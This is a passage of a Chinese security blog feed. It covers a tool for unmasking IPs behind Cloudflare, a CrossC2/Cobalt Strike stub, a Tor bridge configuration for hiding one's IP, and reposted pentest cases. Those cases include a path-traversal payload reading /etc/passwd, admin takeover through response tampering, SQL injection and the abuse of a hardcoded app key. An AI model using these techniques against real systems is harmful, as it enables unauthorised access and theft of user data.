it.</p><figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c"><span class="hljs-meta"># cf-hero -f domains.txt</span><br></code></pre></div></td></tr></table></figure><p>Use the <strong>censys</strong> parameter to include Shodan in the scan</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"># cat <span class="hljs-built_in">domain</span>.txt | <span class="hljs-built_in">cf</span>-hero -censys<br></code></pre></div></td></tr></table></figure><p>Use the <strong>shodan</strong> parameter to include Shodan in the scan</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"># cat <span class="hljs-built_in">domain</span>.txt | <span class="hljs-built_in">cf</span>-hero -shodan<br></code></pre></div></td></tr></table></figure><p>Use the <strong>securitytrails</strong> parameter to include Shodan in the scan</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"># cat <span class="hljs-built_in">domain</span>.txt | <span class="hljs-built_in">cf</span>-hero -securitytrails<br></code></pre></div></td></tr></table></figure><p>Use the -td and -dl parameters to attempt to find the target domain’s IP address by utilizing a list of domains or subdomains that are not behind Cloudflare. By specifying the IP addresses in the blocks where you have identified live IP addresses used by the target’s cloud or on-premises infrastructure with the -dl parameter, you can find the real IP address of the target domain</p><figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c"><span class="hljs-meta"># cf-hero -td https:<span class="hljs-comment">//musana.net -dl sub_domainlist.txt</span></span><br></code></pre></div></td></tr></table></figure><p>to get domains behind of CF</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"># <span class="hljs-built_in">cf</span>-hero -f domains.txt -<span class="hljs-built_in">cf</span><br></code></pre></div></td></tr></table></figure><p>to get domains not behind of CF</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"># <span class="hljs-built_in">cf</span>-hero -f domains.txt -non-<span class="hljs-built_in">cf</span><br></code></pre></div></td></tr></table></figure><p>other options (custom ja3, proxy, worker, user agent)</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">cf-hero -d https://musana.net -ua <span class="hljs-string">&quot;Mozilla&quot;</span> -w 32 -ja3 <span class="hljs-string">&quot;771,22...&quot;</span> -px <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span></span><br></code></pre></div></td></tr></table></figure><p>create cf-hero.yaml file under $HOME&#x2F;.config&#x2F; directory to set censys API key</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># touch ~/.config/cf-hero.yaml</span><br><br><span class="hljs-comment">// content of YAML file should be like;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">securitytrails:</span><br>  - <span class="hljs-string">&quot;api_key_here&quot;</span><br><span class="hljs-symbol">shodan:</span><br>  - <span class="hljs-string">&quot;api_key_here&quot;</span><br><span class="hljs-symbol">censys:</span><br>  - <span class="hljs-string">&quot;api_key_here&quot;</span><br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/07/bypass-cf/image-20250107115755029.png" alt="image-20250107115755029"></p><p><img src="/2025/01/07/bypass-cf/image-20250107115803981.png" alt="image-20250107115803981"></p>]]></content>
    
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux上线CS</title>
    <link href="/2025/01/06/linux%E4%B8%8A%E7%BA%BFCS/"/>
    <url>/2025/01/06/linux%E4%B8%8A%E7%BA%BFCS/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/gloxec/CrossC2/releases/tag/v3.2">https://github.com/gloxec/CrossC2/releases/tag/v3.2</a> </p><p><img src="/2025/01/06/linux%E4%B8%8A%E7%BA%BFCS/image-20250106195728023.png" alt="image-20250106195728023"></p><p>文件结构如下，keys文件从vps中的CS的server中下载</p><p><img src="/2025/01/06/linux%E4%B8%8A%E7%BA%BFCS/image-20250106194135694.png" alt="image-20250106194135694"></p><p>然后编辑cna文件，如下所示</p><p><img src="/2025/01/06/linux%E4%B8%8A%E7%BA%BFCS/image-20250106195548606.png" alt="image-20250106195548606"></p><p>只能https</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GOAD实验室环境搭建3</title>
    <link href="/2024/12/18/GOAD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA3/"/>
    <url>/2024/12/18/GOAD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA3/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GOAD实验室环境搭建2</title>
    <link href="/2024/12/18/GOAD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2/"/>
    <url>/2024/12/18/GOAD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GOAD实验室环境搭建1</title>
    <link href="/2024/12/18/GOAD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA1/"/>
    <url>/2024/12/18/GOAD%E5%AE%9E%E9%AA%8C%E5%AE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用tor配置代理创建匿名隧道保护ip</title>
    <link href="/2024/12/09/%E4%BD%BF%E7%94%A8tor%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E9%9A%A7%E9%81%93%E4%BF%9D%E6%8A%A4ip/"/>
    <url>/2024/12/09/%E4%BD%BF%E7%94%A8tor%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E9%9A%A7%E9%81%93%E4%BF%9D%E6%8A%A4ip/</url>
    
    <content type="html"><![CDATA[<p>下载tor工具，或者下载tor browser，里面文件夹内有对应工具</p><p><a href="https://archive.torproject.org/tor-package-archive/torbrowser/14.0.3/tor-expert-bundle-windows-x86_64-14.0.3.tar.gz">https://archive.torproject.org/tor-package-archive/torbrowser/14.0.3/tor-expert-bundle-windows-x86_64-14.0.3.tar.gz</a></p><p>下载完后，配置前置代理和网桥文件，统一在tor.exe目录下，创建torcc文件或者其他名称</p><p>针对网桥，我的习惯是先打开洋葱浏览器，在设置中获取网桥，这样使用此工具连接成功概率将会变大</p><p><img src="/2024/12/09/%E4%BD%BF%E7%94%A8tor%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E9%9A%A7%E9%81%93%E4%BF%9D%E6%8A%A4ip/image-20241213123136563.png" alt="image-20241213123136563"></p><figure class="highlight py"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs py"><span class="hljs-comment">#下面是跨机共享代理，去掉前面#号即可开启</span><br><span class="hljs-comment">#SocksPort 0.0.0.0:9050</span><br><span class="hljs-comment">#下面是前置代理，去掉前面#号即可开启</span><br><span class="hljs-comment">#HTTPSProxy 127.0.0.1:7890</span><br>Socks5Proxy <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">7890</span><br><span class="hljs-comment">#下面数字改为0，关闭自带网桥连接，开启前置代理</span><br>UseBridges <span class="hljs-number">1</span>    <br>DataDirectory C:\Users\Administrator\Desktop\tools\tor\data<br>GeoIPFile C:\Users\Administrator\Desktop\tools\tor\data\geoip<br>GeoIPv6File C:\Users\Administrator\Desktop\tools\tor\data\geoip6<br><span class="hljs-comment">#下面日志路径，打开后终端不会显示连接日志</span><br><span class="hljs-comment">#Log notice file ./Data/tor.log </span><br><span class="hljs-comment">#StrictNodes 1</span><br>AvoidDiskWrites <span class="hljs-number">1</span><br><span class="hljs-comment">#下面是排除一些国家节点，去掉前面#号即可开启 根据美剧黑客军团 有些节点可能人为创建 自己斟酌此功能</span><br><span class="hljs-comment">#ExcludeExitNodes &#123;cn&#125;,&#123;hk&#125;,&#123;mo&#125;,&#123;sg&#125;,&#123;th&#125;,&#123;pk&#125;,&#123;by&#125;,&#123;ru&#125;,&#123;ir&#125;,&#123;vn&#125;,&#123;ph&#125;,&#123;my&#125;,&#123;cu&#125;</span><br><span class="hljs-comment">#ExcludeNodes &#123;cn&#125;,&#123;hk&#125;,&#123;mo&#125;,&#123;sg&#125;,&#123;th&#125;,&#123;pk&#125;,&#123;by&#125;,&#123;ru&#125;,&#123;ir&#125;,&#123;vn&#125;,&#123;ph&#125;,&#123;my&#125;,&#123;cu&#125;</span><br><br>ClientTransportPlugin obfs4 <span class="hljs-built_in">exec</span> C:\Users\Administrator\Desktop\tools\tor\tor\pluggable_transports\lyrebird.exe managed<br><span class="hljs-comment">#普通网桥格式</span><br><span class="hljs-comment">#Bridge 66.42.73.78:40367 8975AAF1A5317E04600F30AD3ED43083820FF516</span><br><span class="hljs-comment">#obfs4网桥按下面这样填写，注意：自己网桥请严格按下面格式填写，否则会报错！</span><br>Bridge obfs4 <span class="hljs-number">199.247</span><span class="hljs-number">.0</span><span class="hljs-number">.49</span>:<span class="hljs-number">12801</span> 1448B74DA44A7CCF8ADDFE21EEA78962ED2E53AB cert=akkZxHEuHly59gREnj/Pw03Z6xDpdB4qKqyGqUemGXpX7LUb6kYzHAHLP3A2xjxEm3PtHg iat-mode=<span class="hljs-number">0</span><br>Bridge obfs4 <span class="hljs-number">89.58</span><span class="hljs-number">.28</span><span class="hljs-number">.149</span>:<span class="hljs-number">58243</span> A7C450276E053E887AFAB9518397DE342C30A8E1 cert=9S9H/q/PNhJGmnW96Wm/t3BRZkIrdzTo0Qq/T1ot8+A8JhCwuT1mtJ+PWCvX83aQt100PA iat-mode=<span class="hljs-number">0</span><br><br><span class="hljs-comment">#tor默认的重建链路的时间是30s，可以适当延长时间保证速度</span><br>NewCircuitPeriod <span class="hljs-number">900</span><br></code></pre></div></td></tr></table></figure><p><img src="/2024/12/09/%E4%BD%BF%E7%94%A8tor%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E9%9A%A7%E9%81%93%E4%BF%9D%E6%8A%A4ip/image-20241211172514457.png" alt="image-20241211172514457"></p><p>使用 tor.exe -f torcc 100%done表示连接成功，测试，这是使用网桥的效果，实现双层交叉代理</p><p><img src="/2024/12/09/%E4%BD%BF%E7%94%A8tor%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E9%9A%A7%E9%81%93%E4%BF%9D%E6%8A%A4ip/image-20241211165105074.png" alt="image-20241211165105074"></p><p><img src="/2024/12/09/%E4%BD%BF%E7%94%A8tor%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E9%9A%A7%E9%81%93%E4%BF%9D%E6%8A%A4ip/image-20241211165331163.png" alt="image-20241211165331163"></p><p>默认端口是 9050 ，python爬虫也能正常使用</p><p><img src="/2024/12/09/%E4%BD%BF%E7%94%A8tor%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E9%9A%A7%E9%81%93%E4%BF%9D%E6%8A%A4ip/image-20241213123403210.png" alt="image-20241213123403210"></p><p>linux 同理，不过默认路径需要改变而已</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">设置代理监听端口，仅允许本机访问</span><br>SocksPort 127.0.0.1:9050<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置前置代理（Socks5）</span><br>Socks5Proxy 192.168.80.1:7890<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启用前置代理功能</span><br>UseBridges 1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">数据存储目录，确保目录存在且有写权限</span><br>DataDirectory /tmp<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">GeoIP 数据文件路径</span><br>GeoIPFile /usr/share/tor/geoip<br>GeoIPv6File /usr/share/tor/geoip6<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">避免磁盘写入</span><br>AvoidDiskWrites 1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置网桥（示例为 obfs4 格式）</span><br>ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy managed<br>Bridge obfs4 217.170.204.110:443 D70945770CB57EB4C1CF3B610BE4ACED927D5AEC cert=BXn8sU1gaxYqp5XyWvp0h4zE5C99Sv/Bmqlc4+6A5i41noXQIFRxzMQ4RuRpc5i5l/D+YQ iat-mode=0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">延长链路重建时间</span><br>NewCircuitPeriod 900<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[转载]渗透实战一些实用案例</title>
    <link href="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/"/>
    <url>/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<p>转载标签亦在看到网络上的好文和实用文后，备份到此博客，以备不时之需</p><p>此篇来自微信公众</p><h1 id="锐捷RCE"><a href="#锐捷RCE" class="headerlink" title="锐捷RCE"></a>锐捷RCE</h1><p>读账号密码读账号密码</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091223715.png" alt="image-20241205091223715"></p><p>登陆后RCE</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091236430.png" alt="image-20241205091236430"></p><h1 id="综合安防任意文件上传"><a href="#综合安防任意文件上传" class="headerlink" title="综合安防任意文件上传"></a>综合安防任意文件上传</h1><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091306778.png" alt="image-20241205091306778"></p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091312025.png" alt="image-20241205091312025"></p><h1 id="密码处反射XSS"><a href="#密码处反射XSS" class="headerlink" title="密码处反射XSS"></a>密码处反射XSS</h1><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091324527.png" alt="image-20241205091324527"></p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091329406.png" alt="image-20241205091329406"></p><h1 id="改响应包成管理员"><a href="#改响应包成管理员" class="headerlink" title="改响应包成管理员"></a>改响应包成管理员</h1><p>普通用户登录成功返回一堆东西</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091341104.png" alt="image-20241205091341104"></p><p>只将userId改为1</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091354644.png" alt="image-20241205091354644"></p><p>变管理员</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091406566.png" alt="image-20241205091406566"></p><p>爆破出BUG</p><p>X页面登录需要XX码，用burp默认速度爆破8000次，字典可以是1-8000</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091441070.png" alt="image-20241205091441070"></p><h1 id="Authorization未授权访问"><a href="#Authorization未授权访问" class="headerlink" title="Authorization未授权访问"></a>Authorization未授权访问</h1><p>Authorization为空返回401</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091459209.png" alt="image-20241205091459209"></p><p>Authorization填写1，直接未授权访问</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091515180.png" alt="image-20241205091515180"></p><h1 id="前台任意文件下载"><a href="#前台任意文件下载" class="headerlink" title="前台任意文件下载"></a>前台任意文件下载</h1><p>某系统需要登陆，于前端js中找到可疑接口api&#x2F;file?path&#x3D;</p><p>直接..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091530693.png" alt="image-20241205091530693"></p><h1 id="fuzz-aspx未授权访问"><a href="#fuzz-aspx未授权访问" class="headerlink" title="fuzz.aspx未授权访问"></a>fuzz.aspx未授权访问</h1><p>某后台登录路径为：&#x2F;admin&#x2F;login.aspx</p><p>字典里并没有compare.aspx，但是有compare，fuzzlogin位置，fuzz出未授权路径admin&#x2F;compare.aspx</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091554837.png" alt="image-20241205091554837"></p><p>并于查询处发现SQL注入</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091606946.png" alt="image-20241205091606946"></p><h1 id="登录处注入"><a href="#登录处注入" class="headerlink" title="登录处注入"></a>登录处注入</h1><p>某站登陆处存在延时注入</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091617140.png" alt="image-20241205091617140"></p><p>不过数据包里面是加密的，看不懂且没时间解密咋办</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091627598.png" alt="image-20241205091627598"></p><p>看看同一个接口其他参数有无注入或者测试其他接口，此处发现忘记密码处的email参数也存在注入，且没加密。</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091642068.png" alt="image-20241205091642068"></p><h1 id="注册处SQL注入"><a href="#注册处SQL注入" class="headerlink" title="注册处SQL注入"></a>注册处SQL注入</h1><p>发现注册处企业名称、组织机构代码都存在注入</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091653250.png" alt="image-20241205091653250"></p><p>通过一系列分析与构造，在确认注入不会影响到数据库的情况下</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091706657.png" alt="image-20241205091706657"></p><p>使用sqlmap一把梭，没把握就老老实实手注，不然容易包吃住</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091714787.png" alt="image-20241205091714787"></p><h1 id="找回密码处注入"><a href="#找回密码处注入" class="headerlink" title="找回密码处注入"></a>找回密码处注入</h1><p>此处只是填写资料、手机号发送验证码的地方，但是也存在好几处注入</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091731129.png" alt="image-20241205091731129"></p><p>没想到的是验证码也存在注入，在确定漏洞接口只是校验信息，不会修改数据库任何数据的情况下，直接用sqlmap一把梭。如果到了修改密码那一步就老老实实手注吧，不然容易出事，一抓一个准。</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091748282.png" alt="image-20241205091748282"></p><h1 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h1><p>某套系统登陆后抓到该接口，完全就是根据name参数决定什么用户身份，并返回登录凭证，改成了aaa</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091802273.png" alt="image-20241205091802273"></p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091814174.png" alt="image-20241205091814174"></p><p>置空会返回一个权限较高的用户凭证</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091833836.png" alt="image-20241205091833836"></p><p>改成admin变管理员</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091842350.png" alt="image-20241205091842350"></p><h1 id="越权绕过"><a href="#越权绕过" class="headerlink" title="越权绕过"></a>越权绕过</h1><p>某系统对越权做了防御，改id不行了，会提示非法操作，尤其是只解析json格式数据的接口</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091855205.png" alt="image-20241205091855205"></p><p>找到个可以解析id&#x3D;xxx参数的接口，但还是有防护，把数据包改成文件上传格式绕过，此方法通杀该系统很多接口。</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205091914866.png" alt="image-20241205091914866"></p><h1 id="APP反编译-旁站注入拿下目标站敏感数据"><a href="#APP反编译-旁站注入拿下目标站敏感数据" class="headerlink" title="APP反编译+旁站注入拿下目标站敏感数据"></a>APP反编译+旁站注入拿下目标站敏感数据</h1><p>扫描登录页面二维码，下载APP，反编译构造出接口，找到硬编码身份密钥实现未授权访问。渗透APP时发现属于旁站，获得测试授权后发现SQL注入，并将注出的重要数据填入未授权访问接口中，造成大量用户敏感信息泄露。</p><p>渗透流程大体是这样：</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092016638.png" alt="image-20241205092016638"></p><p>具体反编译过程没记录下来，这是发现旁站9093某个wsdl接口存在注入，</p><p>strKey就是身份密钥，于APP中发现，有了这个就可以未授权调用任何接口。</p><p><img src="/2024/12/05/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%80%E4%BA%9B%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B/image-20241205092023612.png" alt="image-20241205092023612"></p><p>注出重要数据</p><p><img 